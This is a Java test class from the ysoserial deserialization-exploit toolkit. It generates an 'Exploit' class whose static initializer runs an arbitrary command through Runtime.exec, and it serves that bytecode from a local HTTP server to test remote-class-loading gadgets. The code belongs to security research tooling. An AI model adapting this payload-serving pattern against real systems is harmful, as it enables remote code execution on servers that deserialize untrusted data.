package ysoserial.payloads;


import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.Random;
import java.util.concurrent.Callable;

import fi.iki.elonen.NanoHTTPD;
import fi.iki.elonen.NanoHTTPD.Response.Status;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import ysoserial.WrappedTest;


/**
 * @author mbechler
 *
 */
public class RemoteClassLoadingTest implements WrappedTest {

    int port;
    private String command;
    private String className;

    /**
     * 
     */
    public RemoteClassLoadingTest ( String command ) {
        this.command = command;
        this.port = new Random().nextInt(65535-1024)+1024;
        this.className = "Exploit-" + System.currentTimeMillis();
    }


    /**
     * {@inheritDoc}
     *
     * @see ysoserial.WrappedTest#getPayloadArgs()
     */
    public String getPayloadArgs () {
        return String.format("http://localhost:%d/", this.port) + ":" + this.className;
    }


    /**
     * {@inheritDoc}
     *
     * @see ysoserial.WrappedTest#createCallable(java.util.concurrent.Callable)
     */
    public Callable<Object> createCallable ( Callable<Object> innerCallable ) {
        return new RemoteClassLoadingTestCallable(this.port, makePayloadClass(), innerCallable);
    }


    protected byte[] makePayloadClass () {
        try {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(Exploit.class));
            final CtClass clazz = pool.get(Exploit.class.getName());
            clazz.setName(this.className);
            clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
            return clazz.toBytecode();
        }
        catch ( Exception e ) {
            e.printStackTrace();
            return new byte[0];
        }
    }

    static class RemoteClassLoadingTestCallable extends NanoHTTPD implements Callable<Object> {

        private Callable<Object> innerCallable;
        private byte[] data;


        /**
         * @param innerCallable
         */
        public RemoteClassLoadingTestCallable ( int port, byte[] data, Callable<Object> innerCallable ) {
            super(port);
            this.data = data;
            this.innerCallable = innerCallable;

        }


        /**
         * {@inheritDoc}
         *
         * @see java.util.concurrent.Callable#call()
         */
        public Object call () throws Exception {
            try {
                setup();
                return this.innerCallable.call();
            }
            finally {
                cleanup();
            }

        }


        /**
         * @throws IOException
         * 
         */
        private void setup () throws IOException {
            start(NanoHTTPD.SOCKET_READ_TIMEOUT, false);
        }


        /**
         * 
         */
        private void cleanup () {
            stop();
        }


        /**
         * {@inheritDoc}
         *
         * @see fi.iki.elonen.NanoHTTPD#serve(fi.iki.elonen.NanoHTTPD.IHTTPSession)
         */
        @Override
        public Response serve ( IHTTPSession sess ) {
            return newFixedLengthResponse(Status.OK, "application/octet-stream", new ByteArrayInputStream(data), data.length);
        }

    }

    public static class Exploit {

    }
}
